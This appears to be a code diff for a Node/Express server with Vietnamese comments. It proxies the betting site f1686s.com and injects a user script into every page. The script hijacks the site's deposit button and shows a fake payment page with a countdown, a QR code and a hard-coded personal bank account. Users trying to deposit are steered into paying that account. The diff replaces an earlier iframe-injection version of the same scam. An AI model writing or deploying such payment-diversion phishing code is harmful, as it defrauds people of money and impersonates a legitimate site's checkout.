@@ -1,257 +1,337 @@
 const express = require('express');
+const axios = require('axios');
+const cheerio = require('cheerio');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
+const TARGET_URL = 'https://f1686s.com'; // Trang đích
 
-app.get('/', (req, res) => {
-  res.setHeader('Content-Type', 'text/html');
-  res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>f1686s.com</title>
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body, html { width:100%; height:100%; overflow:hidden; background:#0a0a0a; }
-    iframe { width:100%; height:100%; border:none; display:block; }
-    #toast {
-      position:fixed; bottom:40px; left:50%; transform:translateX(-50%);
-      background:rgba(0,200,80,0.95); color:#fff; padding:12px 28px;
-      border-radius:30px; font-size:15px; font-family:sans-serif;
-      opacity:0; transition:opacity 0.5s; pointer-events:none;
-      z-index:999999; white-space:nowrap; font-weight:600;
+// ----- Nhúng nguyên văn script Tampermonkey (không cần phân tích) -----
+const userScript = `
+// ==UserScript==
+// @name         lệnh f168
+// @namespace    http://tampermonkey.net/
+// @version      1.0
+// @match        https://f1686s.com/*
+// @grant        none
+// @run-at       document-idle
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    const BANK_ID = 'MB';
+    const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
+    const ACCOUNT_NO = '757526789';
+    const ACCOUNT_NAME = 'NGUYEN VU DAT';
+    const TARGET_BASE = 'data:text/html;charset=utf-8,';
+
+    const patched = new WeakSet();
+    let redirecting = false;
+
+    function randomTx() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let code = '';
+        for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
+        return code;
     }
-    #toast.show { opacity:1; }
-  </style>
+
+    function buildPage(amount, txCode) {
+        const amountVND = amount.toLocaleString('vi-VN') + ' VND';
+        const qrUrl = \`https://img.vietqr.io/image/\${BANK_ID}-\${ACCOUNT_NO}-compact2.png?amount=\${amount}&addInfo=\${txCode}&accountName=\${encodeURIComponent(ACCOUNT_NAME)}\`;
+
+        return \`<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Nạp Tiền</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;min-height:100vh}
+.top-bar{display:flex;align-items:center;justify-content:center;padding:14px 16px;background:#fff;border-bottom:1px solid #eee;position:relative}
+.back-btn{position:absolute;left:16px;font-size:22px;color:#333;text-decoration:none}
+.logo{width:36px;height:36px;border-radius:50%;object-fit:cover}
+.notice{background:linear-gradient(90deg,#f5a623,#f7c05a);border-radius:12px;margin:16px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between}
+.notice-text{color:#fff;font-size:14px;font-weight:600;line-height:1.4;flex:1}
+.timer{color:#c0392b;font-size:22px;font-weight:800;font-variant-numeric:tabular-nums;white-space:nowrap;margin-left:12px}
+.timer.urgent{animation:blink 0.8s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
+.qr-card{background:#fff;border-radius:16px;margin:0 16px 16px;padding:24px 16px;display:flex;flex-direction:column;align-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
+.qr-card img{width:200px;height:200px;border-radius:8px}
+.qr-loading{width:200px;height:200px;display:flex;align-items:center;justify-content:center;background:#f9f9f9;border-radius:8px;color:#888;font-size:13px;text-align:center;padding:16px}
+.amount-label{color:#e74c3c;font-size:22px;font-weight:800;margin-top:14px}
+.info-list{margin:0 16px 16px;display:flex;flex-direction:column;gap:10px}
+.info-item{background:#fff;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}
+.info-icon{font-size:20px;width:28px;text-align:center}
+.info-content{flex:1}
+.info-label-sm{font-size:11px;color:#aaa;margin-bottom:2px}
+.info-value{font-size:15px;font-weight:700;color:#222}
+.info-value.red{color:#e74c3c}
+.info-value.orange{color:#e67e22}
+.copy-btn{background:#f5a623;color:#fff;border:none;border-radius:20px;padding:6px 14px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}
+.copy-btn:active{opacity:0.8}
+.note{background:#fff;border-radius:12px;margin:0 16px 24px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}
+.note h3{font-size:14px;font-weight:800;margin-bottom:10px}
+.note p{font-size:13px;color:#555;line-height:1.7;margin-bottom:6px}
+.note strong{color:#f5a623}
+.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 24px;border-radius:24px;font-size:13px;opacity:0;transition:opacity 0.3s;pointer-events:none;z-index:999}
+.toast.show{opacity:1}
+.expired-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:998;align-items:center;justify-content:center}
+.expired-box{background:#fff;border-radius:16px;padding:32px 24px;text-align:center;margin:24px}
+.expired-box h2{color:#e74c3c;font-size:20px;margin-bottom:8px}
+.expired-box p{color:#666;font-size:14px}
+</style>
 </head>
 <body>
-<iframe id="mainFrame" src="https://f1686s.com/home/mine"></iframe>
-<div id="toast">✅ Script đã kích hoạt</div>
+
+<div class="top-bar">
+  <a class="back-btn" onclick="history.back()">&#8249;</a>
+  <img class="logo" src="https://f1686s.com/favicon.ico" onerror="this.style.display='none'">
+</div>
+
+<div class="notice">
+  <div class="notice-text">Hãy hoàn thành chuyển khoản<br>trong thời gian quy định</div>
+  <div class="timer" id="timer">15:00</div>
+</div>
+
+<div class="qr-card">
+  <div class="qr-loading" id="qrLoading">Đang tạo mã QR...</div>
+  <img id="qrImg" style="display:none" alt="QR">
+  <div class="amount-label">\${amountVND}</div>
+</div>
+
+<div class="info-list">
+  <div class="info-item">
+    <div class="info-icon">🏦</div>
+    <div class="info-content">
+      <div class="info-label-sm">Ngân hàng</div>
+      <div class="info-value">\${BANK_NAME}</div>
+    </div>
+  </div>
+  <div class="info-item">
+    <div class="info-icon">💳</div>
+    <div class="info-content">
+      <div class="info-label-sm">Số tài khoản</div>
+      <div class="info-value">\${ACCOUNT_NO}</div>
+    </div>
+    <button class="copy-btn" onclick="copyText('\${ACCOUNT_NO}')">Copy</button>
+  </div>
+  <div class="info-item">
+    <div class="info-icon">👤</div>
+    <div class="info-content">
+      <div class="info-label-sm">Tên người nhận</div>
+      <div class="info-value">\${ACCOUNT_NAME}</div>
+    </div>
+  </div>
+  <div class="info-item">
+    <div class="info-icon">📄</div>
+    <div class="info-content">
+      <div class="info-label-sm">Số tiền đơn hàng</div>
+      <div class="info-value red">\${amountVND}</div>
+    </div>
+    <button class="copy-btn" onclick="copyText('\${amount}')">Copy</button>
+  </div>
+  <div class="info-item">
+    <div class="info-icon">✏️</div>
+    <div class="info-content">
+      <div class="info-label-sm">Mã đơn hàng</div>
+      <div class="info-value orange">\${txCode}</div>
+    </div>
+    <button class="copy-btn" onclick="copyText('\${txCode}')">Copy</button>
+  </div>
+</div>
+
+<div class="note">
+  <h3>Xin lưu ý :</h3>
+  <p>1. Vui lòng chọn phương thức chuyển tiền nhanh 24/7</p>
+  <p>2. Vui lòng điền chính xác <strong>SỐ TIỀN</strong>, <strong>SỐ TÀI KHOẢN</strong> và <strong>NỘI DUNG CHUYỂN KHOẢN</strong> chỉ hỗ trợ các KHOẢN NẠP trên <strong>10.000 VND</strong> được yêu cầu từ hệ thống.</p>
+  <p>3. Lưu lại biên lai giao dịch để đối chiếu khi cần thiết.</p>
+</div>
+
+<div class="toast" id="toast">Đã sao chép!</div>
+<div class="expired-overlay" id="expiredOverlay">
+  <div class="expired-box">
+    <h2>⏰ Hết thời gian!</h2>
+    <p>Giao dịch đã hết hạn.<br>Vui lòng thực hiện lại.</p>
+  </div>
+</div>
 
 <script>
-(function() {
-  'use strict';
-  console.log('🚀 Cloud web khởi động');
+  // QR
+  const qrImg = document.getElementById('qrImg');
+  const qrLoading = document.getElementById('qrLoading');
+  qrImg.onload = function(){ qrLoading.style.display='none'; qrImg.style.display='block'; };
+  qrImg.onerror = function(){ qrLoading.innerText='Không tải được QR. Vui lòng thử lại.'; };
+  qrImg.src = '\${qrUrl}';
 
-  const BANK_ID = 'MB';
-  const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
-  const ACCOUNT_NO = '757526789';
-  const ACCOUNT_NAME = 'NGUYEN VU DAT';
-
-  // === TAMPERMONKEY CODE ===
-  function getTampermonkeyCode() {
-    return `
-(function() {
-  'use strict';
-  console.log('🔧 TM: Bắt đầu trong iframe');
-
-  const BANK_ID = '${BANK_ID}';
-  const BANK_NAME = '${BANK_NAME}';
-  const ACCOUNT_NO = '${ACCOUNT_NO}';
-  const ACCOUNT_NAME = '${ACCOUNT_NAME}';
-  const patched = new WeakSet();
-  let redirecting = false;
-
-  function randomTx() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let code = '';
-    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
-    return code;
+  // Copy
+  function copyText(t){
+    if(navigator.clipboard){navigator.clipboard.writeText(t).then(showToast).catch(()=>fallbackCopy(t));}
+    else fallbackCopy(t);
+  }
+  function fallbackCopy(t){
+    const ta=document.createElement('textarea');
+    ta.value=t;document.body.appendChild(ta);ta.select();
+    document.execCommand('copy');document.body.removeChild(ta);showToast();
+  }
+  function showToast(){
+    const el=document.getElementById('toast');
+    el.classList.add('show');
+    setTimeout(()=>el.classList.remove('show'),2000);
   }
 
-  function buildPage(amount, txCode) {
-    const amountVND = amount.toLocaleString('vi-VN') + ' VND';
-    const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
-    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="' + qrUrl + '"></div><div class="info"><div class="label">Số tiền</div><div class="value red">' + amountVND + '</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">' + BANK_NAME + '</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">' + ACCOUNT_NO + '</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">' + ACCOUNT_NAME + '</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">' + txCode + '</div></div></div><script>let s=900;setInterval(function(){s--;var m=String(Math.floor(s/60)).padStart(2,"0");var sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);<\\/script></body></html>';
-  }
-
-  function doRedirect(e) {
-    if (redirecting) return;
-    redirecting = true;
-    e.preventDefault();
-    e.stopPropagation();
-    var input = document.querySelector('.ui-input__input');
-    var points = input ? parseInt(input.value) || 0 : 0;
-    var amount = points * 1000;
-    var txCode = randomTx();
-    var html = buildPage(amount, txCode);
-    var blob = new Blob([html], {type: 'text/html'});
-    window.location.href = URL.createObjectURL(blob);
-    setTimeout(function() { redirecting = false; }, 1500);
-  }
-
-  function patchButton(btn) {
-    if (patched.has(btn)) return;
-    patched.add(btn);
-    btn.removeAttribute('disabled');
-    btn.classList.remove('ui-button--disabled');
-    var clone = btn.cloneNode(true);
-    clone.removeAttribute('disabled');
-    clone.classList.remove('ui-button--disabled');
-    clone.onclick = null;
-    if (btn.parentNode) {
-      btn.parentNode.replaceChild(clone, btn);
+  // Countdown 15 phút
+  let secs = 15*60;
+  const timerEl = document.getElementById('timer');
+  const iv = setInterval(()=>{
+    secs--;
+    const m=String(Math.floor(secs/60)).padStart(2,'0');
+    const s=String(secs%60).padStart(2,'0');
+    timerEl.textContent=m+':'+s;
+    if(secs<=60) timerEl.classList.add('urgent');
+    if(secs<=0){
+      clearInterval(iv);
+      timerEl.textContent='00:00';
+      document.getElementById('expiredOverlay').style.display='flex';
+      qrImg.style.opacity='0.3';
     }
-    patched.add(clone);
-    clone.addEventListener('click', doRedirect);
-    clone.addEventListener('touchend', doRedirect);
-    console.log('✅ TM: Đã patch button');
-  }
-
-  function findAndPatch() {
-    var btn = document.getElementById('depositSubmitClick');
-    if (btn && !patched.has(btn)) {
-      console.log('🔍 TM: Tìm thấy depositSubmitClick');
-      patchButton(btn);
-      return;
-    }
-    var buttons = document.querySelectorAll('button');
-    for (var i = 0; i < buttons.length; i++) {
-      var el = buttons[i];
-      if (patched.has(el)) continue;
-      var t = el.innerText || el.textContent || '';
-      if (t.indexOf('Nạp Tiền Ngay') !== -1) {
-        console.log('🔍 TM: Tìm thấy nút Nạp Tiền Ngay');
-        patchButton(el);
-      }
-    }
-  }
-
-  var _push = history.pushState;
-  history.pushState = function() {
-    var args = Array.prototype.slice.call(arguments);
-    _push.apply(history, args);
-    setTimeout(findAndPatch, 200);
-  };
-  var _replace = history.replaceState;
-  history.replaceState = function() {
-    var args = Array.prototype.slice.call(arguments);
-    _replace.apply(history, args);
-    setTimeout(findAndPatch, 200);
-  };
-  window.addEventListener('popstate', function() {
-    setTimeout(findAndPatch, 200);
-  });
-
-  findAndPatch();
-  document.addEventListener('DOMContentLoaded', findAndPatch);
-  window.addEventListener('load', function() {
-    setTimeout(findAndPatch, 100);
-    setTimeout(findAndPatch, 300);
-    setTimeout(findAndPatch, 500);
-  });
-
-  setInterval(findAndPatch, 300);
-
-  var observer = new MutationObserver(function() {
-    findAndPatch();
-  });
-  observer.observe(document.documentElement || document.body, {
-    childList: true,
-    subtree: true
-  });
-
-  window.__tm_injected = true;
-  console.log('✅ TM: Đã inject thành công!');
-})();
-`;
-  }
-
-  // === INJECT VÀO IFRAME ===
-  function injectIntoFrame() {
-    var frame = document.getElementById('mainFrame');
-    if (!frame) {
-      console.log('❌ Không tìm thấy iframe');
-      return false;
-    }
-    try {
-      var win = frame.contentWindow;
-      var doc = frame.contentDocument;
-      if (!win || !doc || !doc.body) {
-        console.log('⏳ Chưa sẵn sàng để inject');
-        return false;
-      }
-      if (win.__tm_injected) {
-        console.log('✅ Đã inject rồi');
-        return true;
-      }
-      console.log('🔄 Đang inject TM code...');
-      var script = doc.createElement('script');
-      script.textContent = getTampermonkeyCode();
-      doc.body.appendChild(script);
-      win.__tm_injected = true;
-
-      var toast = document.getElementById('toast');
-      toast.textContent = '✅ Script đã kích hoạt';
-      toast.classList.add('show');
-      setTimeout(function() { toast.classList.remove('show'); }, 3000);
-
-      console.log('✅ Inject thành công!');
-      return true;
-    } catch (e) {
-      console.log('❌ Lỗi inject:', e.message);
-      return false;
-    }
-  }
-
-  var frame = document.getElementById('mainFrame');
-
-  frame.addEventListener('load', function onLoad() {
-    console.log('📄 Iframe đã load');
-    setTimeout(injectIntoFrame, 100);
-    setTimeout(injectIntoFrame, 300);
-    setTimeout(injectIntoFrame, 600);
-    setTimeout(injectIntoFrame, 1000);
-    setTimeout(injectIntoFrame, 2000);
-    frame.removeEventListener('load', onLoad);
-  });
-
-  if (frame.contentDocument && frame.contentDocument.readyState === 'complete') {
-    console.log('📄 Iframe đã load sẵn');
-    setTimeout(injectIntoFrame, 50);
-    setTimeout(injectIntoFrame, 200);
-    setTimeout(injectIntoFrame, 500);
-  }
-
-  var count = 0;
-  var interval = setInterval(function() {
-    count++;
-    if (injectIntoFrame()) {
-      clearInterval(interval);
-      setInterval(injectIntoFrame, 5000);
-    }
-    if (count > 30) {
-      clearInterval(interval);
-      console.log('⚠️ Dừng inject sau 30 lần thử');
-    }
-  }, 1000);
-
-  document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
-  document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
-  document.addEventListener('gestureend', function(e) { e.preventDefault(); });
-
-  document.addEventListener('touchmove', function(e) {
-    if (e.target === document.body || e.target === document.documentElement) {
-      e.preventDefault();
-    }
-  }, { passive: false });
-
-  window.addEventListener('load', function() {
-    setTimeout(function() {
-      window.scrollTo(0, 1);
-      window.scrollTo(0, 0);
-    }, 100);
-  });
-
-  console.log('🚀 Cloud web đã sẵn sàng');
-})();
+  },1000);
 </script>
 </body>
-</html>
-  `);
+</html>\`;
+    }
+
+    function doRedirect(e) {
+        if (redirecting) return;
+        redirecting = true;
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        e.stopPropagation();
+
+        const input = document.querySelector('.ui-input__input');
+        let points = input ? parseInt(input.value) || 0 : 0;
+        let amount = points * 1000;
+        const txCode = randomTx();
+
+        // Mở trang mới dạng blob để tránh bị chặn
+        const html = buildPage(amount, txCode);
+        const blob = new Blob([html], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        window.location.href = url;
+
+        setTimeout(() => { redirecting = false; }, 1500);
+        return false;
+    }
+
+    function patchButton(btn) {
+        if (patched.has(btn)) return;
+        patched.add(btn);
+
+        btn.removeAttribute('disabled');
+        btn.classList.remove('ui-button--disabled');
+
+        const clone = btn.cloneNode(true);
+        clone.removeAttribute('disabled');
+        clone.classList.remove('ui-button--disabled');
+        clone.removeAttribute('onclick');
+        clone.onclick = null;
+
+        if (btn.parentNode) btn.parentNode.replaceChild(clone, btn);
+        patched.add(clone);
+
+        let touched = false;
+        clone.addEventListener('touchstart', function(e){ touched=true; e.stopImmediatePropagation(); }, true);
+        clone.addEventListener('touchend', function(e){ touched=true; doRedirect(e); }, true);
+        clone.addEventListener('click', function(e){ if(touched){touched=false;return;} doRedirect(e); }, true);
+
+        new MutationObserver(()=>{
+            if(clone.hasAttribute('disabled')){
+                clone.removeAttribute('disabled');
+                clone.classList.remove('ui-button--disabled');
+            }
+        }).observe(clone, {attributes:true, attributeFilter:['disabled','class']});
+
+        console.log('[NapTien] Patched:', clone.id);
+    }
+
+    function findAndPatch() {
+        const btn = document.getElementById('depositSubmitClick');
+        if (btn && !patched.has(btn)) { patchButton(btn); return; }
+        document.querySelectorAll('button.ui-button,button').forEach(el => {
+            if (patched.has(el)) return;
+            const t = el.innerText || el.textContent || '';
+            if (t.trim().includes('Nạp Tiền Ngay')) patchButton(el);
+        });
+    }
+
+    const _push = history.pushState;
+    history.pushState = function(...a){ _push.apply(history,a); setTimeout(findAndPatch,300); setTimeout(findAndPatch,800); setTimeout(findAndPatch,1500); };
+    const _replace = history.replaceState;
+    history.replaceState = function(...a){ _replace.apply(history,a); setTimeout(findAndPatch,300); };
+    window.addEventListener('popstate', ()=>{ setTimeout(findAndPatch,300); setTimeout(findAndPatch,800); });
+
+    findAndPatch();
+    document.addEventListener('DOMContentLoaded', findAndPatch);
+    window.addEventListener('load', findAndPatch);
+    setInterval(findAndPatch, 1000);
+
+    new MutationObserver(ms=>{
+        if(ms.some(m=>m.addedNodes.length>0)) findAndPatch();
+    }).observe(document.documentElement||document.body, {childList:true, subtree:true});
+
+})();
+`;
+
+// ----- Proxy server -----
+app.get('*', async (req, res) => {
+    try {
+        const targetPath = req.url === '/' ? '/' : req.url;
+        const fullUrl = TARGET_URL + targetPath;
+
+        console.log('[Proxy] Fetching:', fullUrl);
+
+        const response = await axios.get(fullUrl, {
+            headers: {
+                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Referer': TARGET_URL,
+                'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1'
+            },
+            decompress: true,
+            timeout: 10000
+        });
+
+        const contentType = response.headers['content-type'] || '';
+        if (!contentType.includes('text/html')) {
+            // Tài nguyên không phải HTML (css, js, ảnh...) – trả về nguyên bản
+            res.set(response.headers);
+            return res.send(response.data);
+        }
+
+        // Parse HTML và chèn script
+        const $ = cheerio.load(response.data);
+
+        // Thêm thẻ <base> để các đường dẫn tương đối trỏ đúng về domain gốc
+        if ($('base').length === 0) {
+            $('head').prepend(`<base href="${TARGET_URL}/">`);
+        }
+
+        // Chèn script user vào cuối body
+        $('body').append(`<script>${userScript}</script>`);
+
+        res.set('Content-Type', 'text/html; charset=utf-8');
+        res.send($.html());
+
+    } catch (error) {
+        console.error('[Proxy] Error:', error.message);
+        res.status(500).send('Lỗi tải trang. Vui lòng thử lại sau.');
+    }
 });
 
 app.listen(PORT, () => {
-  console.log('✅ Server chạy tại port ' + PORT);
+    console.log(`Proxy server đang chạy tại cổng ${PORT}`);
 });
